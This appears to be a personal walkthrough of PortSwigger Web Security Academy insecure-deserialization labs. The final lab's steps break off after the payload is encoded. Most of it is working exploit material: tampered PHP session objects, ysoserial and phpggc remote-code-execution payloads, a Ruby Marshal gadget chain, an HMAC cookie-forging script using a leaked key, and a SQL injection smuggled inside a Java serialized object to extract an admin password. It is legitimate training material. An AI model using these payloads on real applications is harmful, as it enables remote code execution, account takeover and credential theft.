# Portswigger
## Insecure Deserialization
### Modifying serialized objects
```bash

# This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos's account.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: Target -> Issues
Note the 'session' parameter marked as vulnerable serialized PHP
Copy cookie: session=

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d

Go to: Decoder
Decode as URL
Decode as base-64
Copy:

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

Change:

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

Base64-encode
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Send to repeater
Change the 'session' cookie with the new-found 'session' cookie
Ctrl+u to URL-encode
Go to response -> right-click -> Show response in browser
Click "Admin panel"
Upon failure go to: HTTP history
Find:

GET /admin HTTP/1.1

Send to repeater
Replace the cookie with:

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d

Do the same with the following end-point:

/admin/delete?username=carlos

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530000507.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530000532.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530000554.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530000849.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530000727.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530001054.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530001334.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530001501.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530001538.png)

### Modifying serialized data types
```bash

# This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: "My account"
Change email:

email@email.com

Go to: Target -> Issues
Note the 'session' parameter marked as vulnerable serialized PHP
Copy cookie: session=

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzZmY3enAwZW4zazFyYmkwdWZoZm5uZ2xsdjcwNmRidCI7fQ%3d%3d

Change:

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sff7zp0en3k1rbi0ufhfnngllv706dbt";}

To

O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

Base64-encode
Go to: HTTP history
Find:

GET /product?productId=1 HTTP/1.1

Send to repeater
Change the 'session' cookie with the new-found 'session' cookie
Ctrl+u to URL-encode (There are no characters needed for URL-encoding, but consistency is not a bad thing)

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9

Go to response -> right-click -> Show response in browser
Click "Admin panel"
Upon failure go to: HTTP history
Find:

GET /admin HTTP/1.1

Send to repeater
Replace the cookie with:

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9

Do the same with the following end-point:

/admin/delete?username=carlos

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530003052.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530003128.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530003149.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530004432.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530004455.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530004629.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530004646.png)

### Using application functionality to exploit insecure deserialization
```bash

# This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

# You can log in to your own account using the following credentials: wiener:peter

# You also have access to a backup account: gregg:rosebud 

Login as wiener:peter
Go to: "My account"
Change email:

email@email.com

Go to: Target -> Issues
Note the 'session' parameter marked as vulnerable serialized PHP
Intercept is on
Click "Delete account"
Click "Drop" (if you do not click drop or just wanted to see functionality continue to delete and use secondary account)
Copy cookie: session= (secondary account)

Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImtzMWtnc281d3JkeHpjaDlvZXN5ZHQ1dXUyb3ZqZWNuIjtzOjExOiJhdmF0YXJfbGluayI7czoxODoidXNlcnMvZ3JlZ2cvYXZhdGFyIjt9

Change:

O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ks1kgso5wrdxzch9oesydt5uu2ovjecn";s:11:"avatar_link";s:18:"users/gregg/avatar";}

To

O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ks1kgso5wrdxzch9oesydt5uu2ovjecn";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

Base64-encode
Go to: HTTP history
Find:

POST /my-account/delete HTTP/1.1

Send to repeater
Change the 'session' cookie with the new-found 'session' cookie
Ctrl+u to URL-encode (There are no characters needed for URL-encoding, but consistency is not a bad thing)

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531005411.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531004836.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531004907.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531004924.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531005024.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531005143.png)

### Arbitrary object injection in PHP
```bash

# This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to Target -> Issues
Note the 'session' parameter marked as vulnerable serialized PHP
Go to libs -> CustomTemplate.php (still in site map)
Send to repeater
Change:

GET /libs/CustomTemplate.php HTTP/1.1

To

GET /libs/CustomTemplate.php~ HTTP/1.1

Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Copy cookie: session=

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJhcTZsNTFieWhqcThmNWFmYnZza21sanJveTIxb3B1MyI7fQ%3d%3d

URL-decode
Base64-decode

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"aq6l51byhjq8f5afbvskmljroy21opu3";}

Change to:

O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

Base64-encode

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==

Go to repeater
Find:

GET / HTTP/1.1

Change the cookie value to:

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==

Highlight the cookie value
Ctrl+u

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530211947.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530211924.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530212023.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530212346.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530212411.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530212453.png)

### Exploiting Java deserialization with Apache Commons
```bash

# This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

# To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to Target -> Issues
Note the 'session' parameter marked as vulnerable serialized PHP
Find:

GET /my-account HTTP/1.1

Send to repeater

Copy cookie: session=

rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBmZXNjZnI2c2ZwZGJreXE1dzQ4dm5lbmQ1eDRqNzNqcnQABndpZW5lcg%3d%3d

Send to decoder

URL-decode
Base64-decode
Note the java/lang/string
Go to:

https://github.com/frohoff/ysoserial

Right click the "JitPack" -> Copy Link

sudo wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

Copy the output

Paste in decoder
URL-encode

Replace the cookie from:

GET /my-account HTTP/1.1

With the newly URL-encoded content

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530233335.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530233516.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530233417.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530233554.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530233642.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530234216.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530234540.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220530234931.png)

### Exploiting PHP deserialization with a pre-built gadget chain
```bash

# This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

# To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: "My account"
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Send to repeater
Select the cookie: session=

%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2N3BmbXQ2bm54dzFzOXlnZGxnemd4bGp3Y2gwaDBpaSI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%223bf4946b219015570e12c7c7118c6a1bdadc38fe%22%7D

Send to Decoder
URL-decode

{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2N3BmbXQ2bm54dzFzOXlnZGxnemd4bGp3Y2gwaDBpaSI7fQ==","sig_hmac_sha1":"3bf4946b219015570e12c7c7118c6a1bdadc38fe"}

Take the "token" value:

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2N3BmbXQ2bm54dzFzOXlnZGxnemd4bGp3Y2gwaDBpaSI7fQ==

Base64-decode

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"v7pfmt6nnxw1s9ygdlgzgxljwch0h0ii";}

Go to:

GET /my-account HTTP/1.1

View source:

<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->

Visit end-point
Also found at Target -> Site map -> target-domain.com -> cgi-bin -> phpinfo.php
Send to repeater
Observe response
Find:

SECRET_KEY 	kz0x83j9svu1ihucwgs1q2vcoid4x9k0 

sudo git clone https://github.com/ambionics/phpggc.git && cd phpggc

./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6
e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBk
ZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVt
IjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0g
L2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hl
XEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENh
Y2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2Fj
aGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21w
b25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMi
O319Cg==

vi create_cookie.php

<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "kz0x83j9svu1ihucwgs1q2vcoid4x9k0";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>

php create_cookie.php

Copy the output and replace the current cookie with the newly created cookie

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531001445.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531001556.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531003035.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531002314.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531003542.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531010535.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531010754.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531011343.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531011204.png)

### Exploiting Ruby deserialization using a documented gadget chain
```bash

# This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

# To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory. 

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to Target -> Site map -> Issues

"The parameter session appeaars to contain a serialized Ruby object using Marshal."

Go to:

https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

Edit the payload:

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)

To

vi ruby_gadgets.rb

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
#puts Marshal.load(payload)

require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
puts

ruby ruby_gadgets.rb
Copy:

BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==

Go to: Decoder
Paste -> ensure the base64 string is on a single line
URL-encode

%42%41%68%62%43%47%4d%56%52%32%56%74%4f%6a%70%54%63%47%56%6a%52%6d%56%30%59%32%68%6c%63%6d%4d%54%52%32%56%74%4f%6a%70%4a%62%6e%4e%30%59%57%78%73%5a%58%4a%56%4f%68%56%48%5a%57%30%36%4f%6c%4a%6c%63%58%56%70%63%6d%56%74%5a%57%35%30%57%77%5a%76%4f%68%78%48%5a%57%30%36%4f%6c%42%68%59%32%74%68%5a%32%55%36%4f%6c%52%68%63%6c%4a%6c%59%57%52%6c%63%67%59%36%43%45%42%70%62%32%38%36%46%45%35%6c%64%44%6f%36%51%6e%56%6d%5a%6d%56%79%5a%57%52%4a%54%77%63%37%42%32%38%36%49%30%64%6c%62%54%6f%36%55%47%46%6a%61%32%46%6e%5a%54%6f%36%56%47%46%79%55%6d%56%68%5a%47%56%79%4f%6a%70%46%62%6e%52%79%65%51%63%36%43%6b%42%79%5a%57%46%6b%61%51%41%36%44%45%42%6f%5a%57%46%6b%5a%58%4a%4a%49%67%68%68%59%57%45%47%4f%67%5a%46%56%44%6f%53%51%47%52%6c%59%6e%56%6e%58%32%39%31%64%48%42%31%64%47%38%36%46%6b%35%6c%64%44%6f%36%56%33%4a%70%64%47%56%42%5a%47%46%77%64%47%56%79%42%7a%6f%4d%51%48%4e%76%59%32%74%6c%64%47%38%36%46%45%64%6c%62%54%6f%36%55%6d%56%78%64%57%56%7a%64%46%4e%6c%64%41%63%36%43%6b%42%7a%5a%58%52%7a%62%7a%73%4f%42%7a%73%50%62%51%74%4c%5a%58%4a%75%5a%57%77%36%44%30%42%74%5a%58%52%6f%62%32%52%66%61%57%51%36%43%33%4e%35%63%33%52%6c%62%54%6f%4e%51%47%64%70%64%46%39%7a%5a%58%52%4a%49%68%39%79%62%53%41%76%61%47%39%74%5a%53%39%6a%59%58%4a%73%62%33%4d%76%62%57%39%79%59%57%78%6c%4c%6e%52%34%64%41%59%37%44%46%51%37%45%6a%6f%4d%63%6d%56%7a%62%32%78%32%5a%51%3d%3d

Paste the URL-encoded text into the Cookie: sesion= parameter at this end-point:

GET /my-account HTTP/1.

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531223825.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531224644.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531224715.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531224742.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531224820.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531225135.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531225250.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531225325.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531225830.png)

### Developing a custom gadget chain for Java deserialization
```bash

# This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.

# To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete Carlos's account.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to Target -> Site map -> Issues

"The parameter session appears to contain a serialized Java object."

Find:

GET / HTTP/1.1

Send to repeater
Find:

GET /backup/AccessTokenUser.java HTTP/1.1

Send to repeater
Send
Read the output code in the response
Go back to Target -> right-click current-website.com -> Engagement tools -> Discover content -> Session is not running
Find:

GET /backup/ProductTemplate.java HTTP/1.

Send to repeater
Send

sudo apt install default-jdk -y
sudo git clone https://github.com/PortSwigger/serialization-examples.git
sudo chown -R username:username *; sudo chmod -R 700 *; cd serialization-examples/java/solution; vi Main.java

import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("'");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object ID: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}

javac Main.java
java Main

rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=

Copy the serialized object output
Go to: Decoder
URL-encode
Go to:

GET / HTTP/1.1

Use thie URL-encoded object as the cookie
Response:

java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;hc3h2l5l9bkq7d0tscy9&quot;

Change:

"'"

To

"' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--"


import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object ID: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}

javac Main.java
java Main

rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAXycgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QocGFzc3dvcmQgQVMgbnVtZXJpYyksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgRlJPTSB1c2Vycy0t

Copy the serialized object output
Go to: Decoder
URL-encode
Go to:

GET / HTTP/1.1

Use thie URL-encoded object as the cookie
Response: (Second time)

java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;t8gsgr266q8yy2hbyge4&quot;

Login as administrator:t8gsgr266q8yy2hbyge4
Go to: "Admin panel"
Delete username "carlos"

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531231331.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531231419.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531231440.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531231352.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531231531.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601022406.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601022611.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220531235113.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601021740.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601022514.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601023821.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601021850.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601021702.png)

### Developing a custom gadget chain for PHP deserialization
```bash

# This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlos's home directory.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to Target -> Issues
Note the 'session' parameter marked as vulnerable serialized PHP
Find:

GET / HTTP/1.1

Send to repeater

Copy cookie: session=

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJheGcxaHVuemNzcXFvY2E3enB3cTlxM3JwOGZnc3p4ayI7fQ%3d%3d

Send to decoder

URL-decode
Base64-decode

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"axg1hunzcsqqoca7zpwq9q3rp8fgszxk";}

Go to Target -> Site map -> cgi-bin -> libs -> CustomTemplate.php
Send to repeater
Append a tidle to the end-point:

GET /cgi-bin/libs/CustomTemplate.php~ HTTP/1.1

Review the response

Change:

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"axg1hunzcsqqoca7zpwq9q3rp8fgszxk";}

To

O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}

Base64-encode
URL-encode

